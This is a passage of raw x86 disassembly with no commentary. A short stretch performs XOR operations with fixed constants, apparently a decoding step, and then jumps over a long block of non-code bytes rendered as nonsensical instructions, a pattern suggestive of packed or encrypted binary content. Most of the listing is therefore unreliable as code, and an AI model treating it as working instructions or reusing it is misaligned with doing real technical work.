  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0xc5
  407613:	or     BYTE PTR [ebp-0x50],ch
  407616:	pop    ss
  407617:	jge    0x407631
  407619:	sbb    BYTE PTR [esi+0x10181812],bl
  40761f:	pushf  
  407620:	pop    ebp
  407621:	das    
  407622:	and    eax,0x3bb3d3ca
  407627:	out    0x75,eax
  407629:	inc    esp
  40762a:	mov    al,0xb8
  40762c:	xor    eax,0xf86f9a64
  407631:	nop
  407632:	pop    edi
  407633:	fbstp  TBYTE PTR [ecx+0x5]
  407636:	outs   dx,DWORD PTR ds:[esi]
  407637:	mov    bl,0xcf
  407639:	sti    
  40763a:	scas   eax,DWORD PTR es:[edi]
  40763b:	fldcw  WORD PTR [ebp-0x23]
  40763e:	push   ebp
  40763f:	scas   eax,DWORD PTR es:[edi]
  407640:	sbb    edi,DWORD PTR [edi-0x32d85d04]
  407646:	mov    ah,0x51
  407648:	in     al,0x86
  40764a:	mov    eax,0xeae3d55c
  40764f:	in     eax,dx
  407650:	inc    esp
  407651:	stc    
  407652:	(bad)  [ebx+0x764547b2]
  407658:	arpl   WORD PTR [edi+eiz*1-0x38444a4b],bx
  40765f:	adc    ecx,DWORD PTR [edi]
  407661:	ins    DWORD PTR es:[edi],dx
  407662:	jl     0x4076aa
  407664:	mov    dl,0x75
  407666:	sahf   
  407667:	mov    bh,BYTE PTR [ebx-0x1a]
  40766a:	mov    dl,dh
  40766c:	jl     0x407695
  40766e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40766f:	test   al,0x9f
  407671:	outs   dx,BYTE PTR ds:[esi]
  407672:	sahf   
  407673:	push   cs
  407674:	push   es
  407675:	lea    edi,[edx+0x25]
  407678:	jnp    0x40768e
  40767a:	loop   0x40761b
  40767c:	outs   dx,BYTE PTR ds:[esi]
  40767d:	sub    ch,BYTE PTR [esi-0x67]
  407680:	fistp  DWORD PTR [eax]
  407682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407683:	jo     0x40766c
  407685:	pop    ss
  407686:	das    
  407687:	(bad)  
  407688:	or     DWORD PTR [edi-0x657f0161],edi
  40768e:	icebp  
  40768f:	lahf   
  407690:	push   ss
  407691:	fcomp  st(4)
  407693:	enter  0x25f0,0x39
  407697:	push   0x7f73ad85
  40769c:	sbb    BYTE PTR [ecx],al
  40769e:	xchg   ecx,eax
  40769f:	sub    eax,0xf560ba38
  4076a4:	aas    
  4076a5:	xchg   DWORD PTR cs:[edx],eax
  4076a8:	retf   0xd3f7
  4076ab:	mov    WORD PTR [edi+0x3f],es
  4076ae:	jae    0x407656
  4076b0:	(bad)  
  4076b1:	mov    cl,0x46
  4076b3:	iret   
  4076b4:	out    0x2e,al
  4076b6:	arpl   sp,di
  4076b8:	inc    esp
  4076b9:	jae    0x407734
  4076bb:	in     al,dx
  4076bc:	mov    ss,WORD PTR [ecx-0x69]
  4076bf:	jecxz  0x4076b7
  4076c1:	sahf   
  4076c2:	fldcw  WORD PTR ds:0xa0482e86
  4076c8:	inc    ecx
  4076c9:	xchg   ebx,eax
  4076ca:	mov    esp,0x6fd39ca2
  4076cf:	sbb    ah,ah
  4076d1:	outs   dx,DWORD PTR ds:[esi]
  4076d2:	inc    eax
  4076d3:	pop    ss
  4076d4:	add    esi,DWORD PTR [edi-0x1f]
  4076d7:	std    
  4076d8:	test   eax,0x578207c
  4076dd:	adc    cl,BYTE PTR [ebx+esi*2]
  4076e0:	popf   
  4076e1:	jbe    0x407750
  4076e3:	push   ss
  4076e4:	jecxz  0x40766d
  4076e6:	retf   
  4076e7:	xchg   esp,eax
  4076e8:	mov    dh,0x90
  4076ea:	push   ds
  4076eb:	add    eax,0xbe8cc536
  4076f0:	lods   eax,DWORD PTR ds:[esi]
  4076f1:	dec    edx
  4076f2:	xchg   ecx,eax
  4076f3:	adc    al,0xca
  4076f5:	lahf   
  4076f6:	xchg   ebx,eax
  4076f7:	popa   
  4076f8:	imul   esi,DWORD PTR [esi+0x70],0xd31fe090
  4076ff:	lahf   
  407700:	xchg   ebx,eax
  407701:	adc    DWORD PTR ds:0xca408669,edx
  407707:	or     eax,0x8d868ce
  40770c:	xor    al,0xd6
  40770e:	pusha  
  40770f:	jmp    0x738ac394
  407714:	jp     0x4076bf
  407716:	call   0x64ec:0x7b444005
  40771d:	and    DWORD PTR [edi-0x412a5720],ebp
  407723:	shr    DWORD PTR [ecx-0x4344c406],0x13
  40772a:	inc    edi
  40772b:	jl     0x40779a
  40772d:	cmp    ah,BYTE PTR [ebx]
  40772f:	jge    0x407724
  407731:	rcr    BYTE PTR [edi-0x66],1
  407734:	stos   BYTE PTR es:[edi],al
  407735:	push   edi
  407736:	cdq    
  407737:	and    edi,eax
  407739:	mov    ch,0x7
  40773b:	jmp    0x407740
  40773d:	call   0x13103a10
  407742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407743:	pop    es
  407744:	psubsw mm0,QWORD PTR [esi+0xe]
  407748:	push   ecx
  407749:	adc    ch,cl
  40774b:	dec    edi
  40774c:	mov    esi,0x2066ae3f
  407751:	enter  0x43f5,0x8e
  407755:	jmp    0x7fbffabb
  40775a:	daa    
  40775b:	xchg   edx,eax
  40775c:	push   ebx
  40775d:	es cwde 
  40775f:	mov    eax,0x12b5d789
  407764:	ficomp DWORD PTR [edi-0x58]
  407767:	in     eax,0x78
  407769:	adc    edx,edi
  40776b:	mov    ds:0x53b5a188,eax
  407770:	enter  0x180a,0xf0
  407774:	scas   al,BYTE PTR es:[edi]
  407775:	xchg   ebx,eax
  407776:	addr16 sbb al,0xcf
  407779:	mov    ah,0xcf
  40777b:	mov    es,WORD PTR [ebx+0x52b22517]
  407781:	or     al,0x73
  407783:	(bad)  
  407784:	cmp    edi,DWORD PTR [eax+0x15]
  407787:	mov    ds:0xccfd2cc,eax
  40778c:	xchg   edx,eax
  40778d:	pop    eax
  40778e:	and    DWORD PTR [ecx-0x70],edx
  407791:	push   edi
  407792:	jb     0x4077f0
  407794:	cmp    DWORD PTR [edi],ebp
  407796:	inc    ebp
  407798:	push   edi
  407799:	in     eax,0x28
  40779b:	inc    ebp
  40779c:	xor    DWORD PTR [ecx+0x40],esi
  40779f:	mov    dl,0x9f
  4077a1:	mov    ds:0x96c650a1,eax
  4077a6:	mov    al,ds:0xf8ca7246
  4077ab:	enter  0xb11d,0xe0
  4077af:	jnp    0x407772
  4077b1:	movd   mm6,ebx
  4077b4:	cs sbb bh,bh
  4077b7:	or     eax,DWORD PTR [ebx+0x9]
  4077ba:	dec    eax
  4077bb:	dec    ebp
  4077bc:	jg     0x40781e
  4077be:	inc    ebx
  4077bf:	jmp    0xf01a:0xa57cc88c
  4077c6:	mov    ds:0x2efe234b,al
  4077cb:	mov    ebx,0x7427f64f
  4077d0:	adc    BYTE PTR [eax],dl
  4077d2:	ins    DWORD PTR es:[edi],dx
  4077d3:	jle    0x40783a
  4077d5:	cmp    DWORD PTR [edi+0x67a8f80f],edi
  4077db:	jae    0x407821
  4077dd:	test   eax,0xf58bcb4a
  4077e2:	dec    ebp
  4077e3:	call   0x425d:0xb3145118
  4077ea:	sbb    BYTE PTR [ecx],al
  4077ec:	(bad)  
  4077ed:	test   bl,0x94
  4077f0:	add    cl,ch
  4077f2:	mul    ebp
  4077f4:	dec    eax
  4077f5:	test   BYTE PTR [edx-0x69608d87],ah
  4077fb:	(bad)  
  4077fc:	(bad)  
  4077fd:	fmulp  st(5),st
  4077ff:	jecxz  0x4077ac
  407801:	pop    ebp
  407802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407803:	in     eax,dx
  407804:	test   eax,0xa89f4916
  407809:	xchg   BYTE PTR [ebp-0x2e],dh
  40780c:	addr16 sbb eax,0x12103dcf
  407812:	leave  
  407813:	es cmp al,0xee
  407816:	or     esi,DWORD PTR [edx]
  407818:	ret    
  407819:	test   eax,0x8d92bd96
  40781e:	mov    ebx,DWORD PTR [ebx-0x62]
  407821:	sbb    BYTE PTR [edi-0x80],bh
  407824:	lahf   
  407825:	fld    st(1)
  407827:	add    al,0x97
  407829:	push   eax
  40782a:	or     edi,DWORD PTR [edi]
  40782c:	inc    edx
  40782d:	aad    0x69
  40782f:	leave  
  407830:	fdiv   DWORD PTR [edx+0x288a2ed1]
  407836:	pop    esi
  407837:	pop    ebp
  407838:	inc    ebx
  407839:	xchg   ebp,eax
  40783a:	push   0xd4125acc
  40783f:	mov    cs,WORD PTR [eax+0x16]
  407842:	(bad)  
  407843:	loopne 0x40789d
  407845:	xor    al,0x7
  407847:	jmp    DWORD PTR ds:0x530e1bda
  40784d:	call   0x89993d8
  407852:	test   DWORD PTR [esi-0x35],ebp
  407855:	dec    DWORD PTR [edx+eax*8-0x7dd3f63]
  40785c:	inc    ecx
  40785d:	rol    BYTE PTR [ecx+0x7c],cl
  407860:	js     0x40781f
  407862:	outs   dx,DWORD PTR ds:[esi]
  407863:	repz pop ebp
  407865:	fwait
  407866:	ds add eax,0xc9c53847
  40786c:	sub    al,0x5
  40786e:	sbb    eax,0xcfdc6975
  407873:	jnp    0x4078d0
  407875:	aas    
  407876:	rol    DWORD PTR [esi+0x38],cl
  407879:	jg     0x40786c
  40787b:	test   ecx,edx
  40787d:	je     0x407883
  40787f:	mul    BYTE PTR [ebp-0x60]
  407882:	lahf   
  407883:	jnp    0x1c61e6bc
  407889:	out    0xe0,al
  40788b:	mov    eax,0xeb1ab32d
  407890:	je     0x407870
  407892:	into   
  407893:	cwde   
  407894:	retw   0xdbe6
  407898:	mov    edx,DWORD PTR [esi+0x28bc6bd]
  40789e:	sbb    al,0x1b
  4078a0:	or     BYTE PTR [edx],cl
  4078a2:	test   eax,0xd54c9a
  4078a7:	push   ebp
  4078a8:	ja     0x407873
  4078aa:	dec    ebx
  4078ab:	fnsave [ecx+0x2b]
  4078ae:	retf   0xbacb
  4078b1:	aad    0xd5
  4078b3:	adc    eax,eax
  4078b5:	pop    ebx
  4078b6:	mov    dl,0x31
  4078b8:	jle    0x407934
  4078ba:	pop    esp
  4078bb:	pop    ecx
  4078bc:	add    dh,bh
  4078be:	mov    DWORD PTR [ebx-0x59],esp
  4078c1:	adc    al,0x27
  4078c3:	jae    0x40791b
  4078c5:	push   ss
  4078c6:	ss popf 
  4078c8:	lods   al,BYTE PTR ds:[esi]
  4078c9:	imul   ecx,DWORD PTR [ebx-0x2],0xffffffdb
  4078cd:	and    BYTE PTR [ebp+0x5e],ah
  4078d0:	fbstp  TBYTE PTR [ecx]
  4078d2:	fsub   st(7),st
  4078d4:	cmp    bl,BYTE PTR [esp+eax*8]
  4078d7:	mov    ah,cl
  4078d9:	pop    ebp
  4078da:	jg     0x407953
  4078dc:	leave  
  4078dd:	xor    al,0x66
  4078df:	and    edx,ebx
  4078e1:	stos   DWORD PTR es:[edi],eax
  4078e2:	adc    esp,DWORD PTR [edx]
  4078e4:	cli    
  4078e5:	dec    ebx
  4078e6:	xor    DWORD PTR gs:[edi],0xffffffed
  4078ea:	fstp   QWORD PTR [ebp-0x6311f29]
  4078f0:	or     edi,edi
  4078f2:	int3   
  4078f3:	xor    BYTE PTR [esi+ebx*2-0x42f36faf],ch
  4078fa:	xchg   edi,eax
  4078fb:	pushf  
  4078fc:	mov    ds:0xd038eec4,eax
  407901:	imul   eax,DWORD PTR [eax-0x3c],0xffffffb4
  407905:	inc    ecx
  407906:	pop    ecx
  407907:	test   al,0x6a
  407909:	xchg   esi,eax
  40790a:	ja     0x40798a
  40790c:	ins    DWORD PTR es:[edi],dx
  40790d:	jge    0x407920
  40790f:	int    0x45
  407911:	sar    DWORD PTR [ebp-0x71],cl
  407914:	inc    esi
  407915:	call   0x695b408
  40791a:	pushf  
  40791b:	mov    al,0xd7
  40791d:	lods   al,BYTE PTR ds:[esi]
  40791e:	clc    
  40791f:	mov    dl,0xbe
  407921:	sti    
  407922:	and    bl,BYTE PTR [esi-0x35]
  407925:	fs dec edi
  407927:	xor    al,0x64
  407929:	test   DWORD PTR [ebx],ebp
  40792b:	jno    0x4078f5
  40792d:	je     0x4078f1
  40792f:	pop    es
  407930:	or     eax,DWORD PTR [esi-0x26]
  407933:	xor    dl,BYTE PTR [ebp-0x684442ad]
  407939:	sbb    al,0x13
  40793b:	mov    edi,0x42e42025
  407940:	add    DWORD PTR [edi+eiz*4-0x4f],0xffffffa9
  407945:	pop    ecx
  407946:	jno    0x4079c2
  407948:	add    ebx,DWORD PTR [ebx+ebx*2-0x6d]
  40794c:	sub    eax,0x24be3315
  407951:	mov    ch,BYTE PTR [ebp+0x30d7124e]
  407957:	or     ch,ah
  407959:	add    DWORD PTR [edi+esi*2+0x51],esi
  40795d:	jb     0x407971
  40795f:	sti    
  407960:	mov    dl,ch
  407962:	fcmovne st,st(2)
  407964:	sar    DWORD PTR [ebx],0x2d
  407967:	pusha  
  407968:	mov    ds:0x4bb7f615,al
  40796d:	mov    ch,0xd7
  40796f:	xchg   edi,edx
  407971:	nop
  407972:	cwde   
  407973:	push   esi
  407974:	hlt    
  407975:	jb     0x407988
  407977:	mov    al,ds:0xcc4291d
  40797c:	loope  0x407992
  40797e:	shl    BYTE PTR [esi],cl
  407980:	test   BYTE PTR [edx-0x5],ah
  407983:	jmp    0x4079cb
  407985:	icebp  
  407986:	cmp    al,BYTE PTR [esi+0x41dc3296]
  40798c:	cmp    esi,ebx
  40798e:	ss pop ebx
  407990:	stc    
  407991:	fisttp WORD PTR [eax]
  407993:	adc    eax,0x556a803d
  407998:	mov    bh,0x80
  40799a:	hlt    
  40799b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40799c:	outs   dx,DWORD PTR ds:[esi]
  40799d:	cs push ebx
  40799f:	popa   
  4079a0:	sbb    ch,BYTE PTR [ecx-0x12]
  4079a3:	out    0x54,eax
  4079a5:	fiadd  DWORD PTR [ebx+ecx*4+0x32771ce7]
  4079ac:	jmp    0x4079be
  4079ae:	sub    al,0xa5
  4079b0:	popf   
  4079b1:	inc    edx
  4079b2:	xchg   BYTE PTR [ecx-0xa],bl
  4079b5:	jle    0x4079a0
  4079b7:	push   edi
  4079b8:	jae    0x40798c
  4079ba:	scas   al,BYTE PTR es:[edi]
  4079bb:	leave  
  4079bc:	out    dx,eax
  4079bd:	mov    cl,0x48
  4079bf:	mov    ebx,0x1dcbea10
  4079c4:	mov    esp,0x7ad63ca
  4079c9:	or     BYTE PTR [ecx],ch
  4079cb:	(bad)  
  4079cc:	shr    BYTE PTR [ebx+0x3002e35f],cl
  4079d2:	fadd   DWORD PTR [ecx-0x7a]
  4079d5:	inc    esp
  4079d6:	mul    edx
  4079d8:	and    dl,dl
  4079da:	mov    ecx,0x493a8a8f
  4079df:	mov    DWORD PTR [ebp-0x34],eax
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x407a1e
  4079f4:	jae    0x4079b1
  4079f6:	mov    al,0x9d
  4079f8:	jne    0x407a12
  4079fa:	sbb    BYTE PTR [esi+0x39181812],bl
  407a00:	jbe    0x4079a4
  407a02:	xor    esp,eax
  407a04:	sar    al,0x63
  407a07:	pop    ebp
  407a09:	out    dx,al
  407a0a:	fist   WORD PTR [edx]
  407a0c:	cwde   
  407a0d:	data16 mov WORD PTR [edx-0x6719b655],cs
  407a14:	xor    BYTE PTR [ecx+0x48907b5b],0x11
  407a1b:	pop    es
  407a1c:	xchg   esi,eax
  407a1d:	out    0x55,eax
  407a1f:	add    eax,0xfe23c0d1
  407a24:	dec    edx
  407a25:	sbb    DWORD PTR [edx-0x6a],esp
  407a28:	dec    eax
  407a29:	aam    0xe
  407a2b:	mov    eax,ds:0xf36d4e3c
  407a30:	nop
  407a31:	in     al,dx
  407a32:	aad    0xd
  407a34:	mov    BYTE PTR ds:0xe312a7df,ah
  407a3a:	pop    esp
  407a3b:	xor    esi,DWORD PTR [ebx-0x8]
  407a3e:	mov    ch,0xab
  407a40:	sub    al,0x1e
  407a42:	out    dx,al
  407a43:	fsub   st,st(6)
  407a45:	cmp    eax,0xde633b6d
  407a4a:	out    0x3c,eax
  407a4c:	and    ebp,ecx
  407a4e:	xlat   BYTE PTR ds:[ebx]
  407a4f:	xor    eax,DWORD PTR [ecx-0x10]
  407a52:	mov    al,ds:0x35ae2503
  407a57:	in     al,dx
  407a58:	jmp    0xf754075d
  407a5d:	sbb    DWORD PTR [ecx+edi*2-0x65a0cf3b],edi
  407a64:	jns    0x407a1a
  407a66:	cs pop ebx
  407a68:	dec    edi
  407a69:	stos   BYTE PTR es:[edi],al
  407a6a:	push   0xffffffae
  407a6c:	inc    ebx
  407a6d:	xor    BYTE PTR [ebx-0x5d],al
  407a70:	les    edi,FWORD PTR [edx-0x33]
  407a73:	imul   eax,DWORD PTR [ebx],0x5e85ae1b
  407a79:	lock imul ebx,DWORD PTR [ebp-0x6c],0x583c16f
  407a81:	adc    eax,0xffffffeb
  407a84:	bound  edx,QWORD PTR [edx-0x50ac9abf]
  407a8a:	push   cs
  407a8b:	jg     0x407aff
  407a8d:	mov    ebx,0xe20f2e3f
  407a92:	out    dx,al
  407a93:	into   
  407a94:	inc    edx
  407a95:	xchg   esp,eax
  407a96:	or     eax,0xf4f11b1f
  407a9b:	(bad)  
  407a9c:	jmp    0xfa9fc298
  407aa1:	mov    cl,BYTE PTR [esi+ebx*2+0x39]
  407aa5:	sub    eax,edi
  407aa7:	inc    ebp
  407aa8:	xchg   ebp,eax
  407aa9:	lods   al,BYTE PTR ds:[esi]
  407aaa:	sahf   
  407aab:	mov    BYTE PTR [ebx],cl
  407aad:	sbb    al,0x7d
  407aaf:	and    al,BYTE PTR [edx+0x4a]
  407ab2:	jl     0x407a3f
  407ab4:	add    al,0xfa
  407ab6:	loop   0x407a3e
  407ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ab9:	xor    eax,0x55801b8a
  407abe:	pop    DWORD PTR ds:[ebx+0x64]
  407ac2:	cli    
  407ac3:	cs gs cwde 
  407ac6:	leave  
  407ac7:	inc    edx
  407ac8:	mov    al,ds:0xd94216b2
  407acd:	xor    eax,DWORD PTR [edi-0x5f]
  407ad0:	(bad)  
  407ad1:	popa   
  407ad2:	sar    DWORD PTR ss:[ebp+0x15e83c1a],cl
  407ad9:	cmp    eax,0xdcd3763d
  407ade:	scas   eax,DWORD PTR es:[edi]
  407adf:	and    esp,ebp
  407ae1:	sub    bh,BYTE PTR [edi]
  407ae3:	(bad)  
  407ae4:	call   0xa2b80326
  407ae9:	or     DWORD PTR [edx-0x66],ebx
  407aec:	ds mov ch,0x91
  407aef:	mov    cl,0x9a
  407af1:	inc    esp
  407af2:	je     0x407b05
  407af4:	iret   
  407af5:	cmp    eax,0x62c716af
  407afa:	xchg   esi,eax
  407afb:	sub    bh,BYTE PTR [esi-0x6f]
  407afe:	pop    ebx
  407aff:	xchg   ebx,eax
  407b00:	into   
  407b01:	test   cl,ah
  407b03:	retf   0x44e1
  407b06:	jmp    0x407b4c
  407b08:	pop    edx
  407b09:	sbb    eax,0xf982a82d
  407b0e:	adc    ebx,ecx
  407b10:	xor    dl,bl
  407b12:	pop    es
  407b13:	cmp    ah,BYTE PTR [edi+0x750a30ba]
  407b19:	enter  0xbee,0xd
  407b1d:	xor    bh,al
  407b1f:	and    bh,BYTE PTR [esi]
  407b21:	fucomip st,st(1)
  407b23:	mov    esi,0x11662557
  407b28:	add    esp,DWORD PTR [ebp+0x60]
  407b2b:	jge    0x407b9c
  407b2d:	lods   eax,DWORD PTR ds:[esi]
  407b2e:	jnp    0x407b25
  407b30:	hlt    
  407b31:	jb     0x407b9d
  407b33:	xchg   ebx,eax
  407b34:	lods   al,BYTE PTR ds:[esi]
  407b35:	xchg   ecx,eax
  407b36:	adc    BYTE PTR es:[eax],0x96
  407b3a:	nop
  407b3b:	pop    ds
  407b3c:	lods   eax,DWORD PTR ds:[esi]
  407b3d:	test   eax,0x1aa22198
  407b42:	pop    eax
  407b43:	sti    
  407b44:	(bad)  
  407b45:	(bad)  
  407b46:	clc    
  407b47:	(bad)  
  407b48:	imul   esp,edx,0x4b
  407b4b:	aad    0x14
  407b4d:	sbb    bh,0xef
  407b50:	cld    
  407b51:	add    BYTE PTR [esi+eiz*2-0x1bc9cc26],dl
  407b58:	icebp  
  407b59:	pop    bx
  407b5b:	sti    
  407b5c:	xchg   ebx,eax
  407b5d:	mov    bh,0x17
  407b5f:	popa   
  407b60:	das    
  407b61:	xor    al,BYTE PTR [eax]
  407b63:	jmp    0x5264c023
  407b68:	add    al,0xb0
  407b6a:	int    0x51
  407b6c:	std    
  407b6d:	aam    0x27
  407b6f:	pop    ss
  407b70:	cwde   
  407b71:	fnstenv [edi]
  407b73:	pop    edx
  407b74:	push   0x912acbb6
  407b79:	hlt    
  407b7a:	ins    DWORD PTR es:[edi],dx
  407b7b:	xchg   esi,eax
  407b7c:	jmp    0x407afe
  407b7e:	das    
  407b7f:	pop    ecx
  407b80:	and    al,0xe0
  407b82:	xor    bl,BYTE PTR ds:0xe7a0812b
  407b88:	dec    edx
  407b89:	shl    ebx,0x28
  407b8c:	pop    edx
  407b8d:	sub    ebp,DWORD PTR [edi+0x462aa902]
  407b93:	jo     0x407b30
  407b95:	in     al,dx
  407b96:	push   esi
  407b97:	sub    BYTE PTR [edx],ah
  407b99:	stc    
  407b9a:	cmp    BYTE PTR [edx+0x2f],ch
  407b9d:	xchg   esi,eax
  407b9e:	sbb    ch,BYTE PTR ds:0xa5ee4c93
  407ba4:	out    0x32,eax
  407ba6:	pop    ss
  407ba7:	imul   ecx,DWORD PTR [edi-0x320b88c],0xb0616b8d
  407bb1:	or     ah,BYTE PTR [ecx-0x7a50368a]
  407bb7:	(bad)  
  407bb8:	aas    
  407bb9:	xchg   ecx,eax
  407bba:	call   0x86aa:0x7745f5ba
  407bc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bc2:	repz push 0x5
  407bc5:	mov    eax,0xfa6d07bd
  407bca:	stos   BYTE PTR es:[edi],al
  407bcb:	mov    eax,0x83bc5a7b
  407bd0:	addr16 mov ebx,0xf58a5b32
  407bd6:	add    esp,ebp
  407bd8:	fst    QWORD PTR [edx-0x35]
  407bdb:	dec    ebx
  407bdc:	or     edi,DWORD PTR [ecx-0x42f8986]
  407be2:	adc    al,BYTE PTR [esi]
  407be4:	jg     0x407c23
  407be6:	jge    0x407b6a
  407be8:	std    
  407be9:	pusha  
  407bea:	sbb    DWORD PTR [edi-0x130b2296],ebp
  407bf0:	adc    eax,0x303dda9b
  407bf5:	xor    BYTE PTR [ebx],al
  407bf7:	inc    edx
  407bf8:	jnp    0x407b9b
  407bfa:	stos   DWORD PTR es:[edi],eax
  407bfb:	mov    ecx,0x174dd167
  407c00:	ins    DWORD PTR es:[edi],dx
  407c01:	lods   al,BYTE PTR ds:[esi]
  407c02:	adc    al,BYTE PTR [eax*1-0x4933ae03]
  407c09:	mov    eax,ds:0xcbd95883
  407c0e:	push   esp
  407c0f:	add    BYTE PTR [esi],al
  407c11:	xchg   edx,eax
  407c12:	ins    BYTE PTR es:[edi],dx
  407c13:	jecxz  0x407c14
  407c15:	mov    cl,0x19
  407c17:	(bad)  
  407c18:	cmp    al,0xfb
  407c1a:	cmp    al,0xdd
  407c1c:	ret    
  407c1d:	leave  
  407c1e:	adc    al,0x85
  407c20:	ror    DWORD PTR [esi*4+0x207a977e],1
  407c27:	push   ebp
  407c28:	in     eax,0x6d
  407c2a:	mov    al,ds:0x8eaccbb4
  407c2f:	push   eax
  407c30:	idiv   BYTE PTR [edi]
  407c32:	test   DWORD PTR [ecx+ebx*4-0x77a1204],edx
  407c39:	fwait
  407c3a:	hlt    
  407c3b:	inc    esp
  407c3c:	or     dh,bh
  407c3e:	lea    edx,[ecx+0x27]
  407c41:	pop    edx
  407c42:	inc    ebp
  407c43:	ror    BYTE PTR [edx-0x797b616e],0x92
  407c4a:	xchg   edi,eax
  407c4b:	shufps xmm3,XMMWORD PTR [edx],0xaf
  407c4f:	dec    eax
  407c50:	xchg   ebx,eax
  407c51:	pop    esp
  407c52:	ret    
  407c53:	(bad)  
  407c54:	aam    0xe3
  407c56:	adc    DWORD PTR [ebp-0x46],esi
  407c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c5a:	mov    ebp,0x1e46f779
  407c5f:	lods   eax,DWORD PTR ds:[esi]
  407c60:	lahf   
  407c61:	xor    cl,dh
  407c63:	clc    
  407c64:	(bad)  
  407c66:	and    DWORD PTR gs:[eax],0x607e60aa
  407c6d:	inc    eax
  407c6e:	mov    DWORD PTR [eax+0x6c6ab5d7],ebx
  407c74:	enter  0x6037,0x22
  407c78:	mov    WORD PTR [esp+0x43],?
  407c7c:	inc    ecx
  407c7d:	dec    ebp
  407c7e:	(bad)  
  407c7f:	mov    ebx,0x2c4401f0
  407c84:	push   ss
  407c85:	jecxz  0x407ca5
  407c87:	sub    edi,DWORD PTR [edx+0x26]
  407c8a:	push   0xe21bb159
  407c8f:	mov    esi,DWORD PTR [edx]
  407c91:	xor    bh,BYTE PTR [ebx-0x7b7f540]
  407c97:	xchg   esp,eax
  407c98:	jl     0x407c8a
  407c9a:	dec    eax
  407c9b:	sbb    bl,0x4c
  407c9e:	mov    edi,0x71af1a57
  407ca3:	adc    eax,esp
  407ca5:	inc    eax
  407ca6:	jg     0x407c5e
  407ca8:	xor    ebp,DWORD PTR ds:0xfee92b98
  407cae:	dec    edi
  407caf:	inc    ebp
  407cb0:	mov    ecx,0xab59317d
  407cb5:	mov    al,ds:0xda651b4e
  407cba:	in     eax,0x30
  407cbc:	sahf   
  407cbd:	inc    edx
  407cbe:	aaa    
  407cbf:	lea    ebp,[ebx+0x74]
  407cc2:	aaa    
  407cc3:	icebp  
  407cc4:	cs jnp 0x407c7f
  407cc7:	cmp    BYTE PTR [ebp-0x80],cl
  407cca:	in     eax,0xaf
  407ccc:	imul   esi,DWORD PTR [esi-0x4b],0x4276d40
  407cd3:	push   0x69
  407cd5:	test   DWORD PTR [eax],ebx
  407cd7:	inc    edi
  407cd8:	fstp   TBYTE PTR [eax+0x3fab82f3]
  407cde:	pop    ebp
  407cdf:	jmp    0x153cf6f
  407ce4:	pop    ecx
  407ce5:	icebp  
  407ce6:	ret    0x9529
  407ce9:	xor    ch,BYTE PTR [ebx]
  407ceb:	mov    ecx,0x8e96f36
  407cf0:	xchg   ebx,eax
  407cf1:	scas   al,BYTE PTR es:[edi]
  407cf2:	fldenv [edi+0x72]
  407cf5:	int3   
  407cf6:	leave  
  407cf7:	or     BYTE PTR [ebx+edx*1+0x49],dl
  407cfb:	xchg   esi,eax
  407cfc:	fimul  WORD PTR [edx+0x44]
  407cff:	xchg   esi,eax
  407d00:	out    0x5e,al
  407d02:	or     bl,bh
  407d04:	imul   ebp,DWORD PTR [esi+0xd56678f],0x77
  407d0b:	iret   
  407d0c:	inc    edi
  407d0d:	in     al,0x39
  407d0f:	jle    0x407d57
  407d11:	and    al,0x2a
  407d13:	pop    esi
  407d14:	xchg   esp,eax
  407d15:	dec    ebp
  407d16:	add    DWORD PTR [ecx],edx
  407d18:	ds jle 0x407d91
  407d1b:	ret    0x686d
  407d1e:	inc    BYTE PTR [ebp+0x403cc24a]
  407d24:	xor    bl,dh
  407d26:	inc    edi
  407d27:	mov    esp,0x3d835edf
  407d2c:	arpl   WORD PTR [esi+edi*8],bp
  407d2f:	mov    BYTE PTR [eax+edi*4+0x1a],al
  407d33:	mov    DWORD PTR [esp+edi*4-0x239ffc4c],esi
  407d3a:	imul   ecx,DWORD PTR ss:[ebp+0x2dad4fbb],0x70
  407d42:	popf   
  407d43:	adc    DWORD PTR [edx],esp
  407d45:	mov    esp,0xbf590bd
  407d4a:	(bad)  
  407d4b:	test   al,0xfc
  407d4d:	mov    dl,BYTE PTR [ebx+0x22]
  407d50:	xchg   ecx,eax
  407d51:	packuswb mm3,QWORD PTR [ecx-0x4f49a97e]
  407d58:	int    0xb8
  407d5a:	mov    fs,esi
  407d5c:	mov    edx,0xbdec6913
  407d61:	std    
  407d62:	ret    0xcab7
  407d65:	fidivr DWORD PTR [eax+0xf422783]
  407d6b:	dec    edx
  407d6c:	inc    esi
  407d6d:	add    eax,0xd6552016
  407d72:	ins    BYTE PTR es:[edi],dx
  407d73:	ja     0x407da7
